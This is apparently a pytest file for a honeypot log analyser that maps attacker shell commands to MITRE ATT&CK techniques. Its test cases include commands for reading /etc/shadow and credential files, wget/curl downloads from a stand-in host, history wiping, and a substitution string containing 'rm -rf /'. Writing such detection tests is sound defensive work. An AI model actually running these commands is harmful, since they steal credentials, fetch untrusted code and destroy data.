from __future__ import annotations

import pytest

from cowrie_soc.commands import analyze, split_commands


def test_split_compound_exec_line_from_real_openssh_session() -> None:
    cmds, fallback = split_commands("uname -a; cat /etc/shadow; ls -la /var/backups/db")
    assert cmds == [["uname", "-a"], ["cat", "/etc/shadow"], ["ls", "-la", "/var/backups/db"]]
    assert not fallback


def test_split_handles_pipes_logic_quotes_and_redirects() -> None:
    cmds, _ = split_commands("cat /proc/cpuinfo | grep 'model name' && echo ok > /tmp/x || true")
    assert cmds == [["cat", "/proc/cpuinfo"], ["grep", "model name"], ["echo", "ok"], ["true"]]


def test_split_unbalanced_quotes_falls_back() -> None:
    cmds, fallback = split_commands("echo 'oops; uname -a")
    assert fallback
    assert ["uname", "-a"] in cmds


@pytest.mark.parametrize(
    ("line", "technique"),
    [
        ("uname -a", "T1082"),
        ("cat /etc/os-release", "T1082"),
        ("cat /proc/cpuinfo | grep 'model name' | head -1", "T1082"),
        ("whoami", "T1033"),
        ("id", "T1033"),
        ("cat /etc/passwd", "T1087.001"),
        ("getent passwd", "T1087.001"),
        ("ls -la /var/backups", "T1083"),
        ("find / -name '*.conf'", "T1083"),
        ("ifconfig", "T1016"),
        ("ip addr", "T1016"),
        ("cat /etc/resolv.conf", "T1016"),
        ("netstat -tunlp", "T1049"),
        ("ss -antp", "T1049"),
        ("ps aux", "T1057"),
        ("cat /etc/shadow", "T1003.008"),
        ("cat db/.my.cnf", "T1552.001"),
        ("wget http://192.0.2.10/x.sh", "T1105"),
        ("busybox wget http://192.0.2.10/x", "T1105"),
        ("sudo -u root curl -o /tmp/a http://192.0.2.10/a", "T1105"),
        ("chmod +x /tmp/update.sh", "T1222.002"),
        ("chmod 755 bot", "T1222.002"),
        ("history -c", "T1070.003"),
        ("unset HISTFILE", "T1070.003"),
        ("rm -f ~/.bash_history", "T1070.003"),
    ],
)
def test_indicators(line: str, technique: str) -> None:
    assert technique in analyze(line).technique_ids


@pytest.mark.parametrize("line", ["echo hello", "date", "cd /tmp", "exit", "chmod 644 notes.txt", "chmod o-x f"])
def test_benign_commands_have_no_indicators(line: str) -> None:
    assert analyze(line).technique_ids == []


def test_download_outputs_and_execution_paths() -> None:
    a = analyze("wget http://192.0.2.10/bins/update.sh -O /tmp/update.sh")
    assert a.download_urls == ["http://192.0.2.10/bins/update.sh"]
    assert a.download_outputs == ["/tmp/update.sh"]
    b = analyze("curl -O http://192.0.2.10/bins/bot.arm7?x=1")
    assert b.download_outputs == ["bot.arm7"]
    assert analyze("./update.sh").executed_paths == ["./update.sh"]
    assert analyze("sh /tmp/x.sh").executed_paths == ["/tmp/x.sh"]


def test_cd_hint_is_applied_to_later_reads_on_same_line() -> None:
    a = analyze("cd /var/backups && cat db/.my.cnf; cat app/.env")
    assert a.file_reads == [("db/.my.cnf", "/var/backups"), ("app/.env", "/var/backups")]


def test_untrusted_input_is_only_tokenized() -> None:
    # Shell metacharacters, substitutions and SQL-ish text are treated as plain tokens.
    a = analyze("cat $(rm -rf /) `reboot` '; DROP TABLE events;--'")
    assert a.commands[0].program == "cat"
    assert "T1083" not in a.technique_ids


@pytest.mark.parametrize("line", ["HISTSIZE=0", "HISTFILE=/dev/null", "export HISTFILESIZE=0"])
def test_history_variable_assignments(line: str) -> None:
    assert analyze(line).technique_ids == ["T1070.003"]


def test_copy_destination_is_not_a_read() -> None:
    # Regression: `cp .env.example .env` was reported as reading the credential file .env.
    assert analyze("cp .env.example .env").technique_ids == []
    assert analyze("cp /var/backups/app/.env /tmp/x").technique_ids == ["T1552.001"]
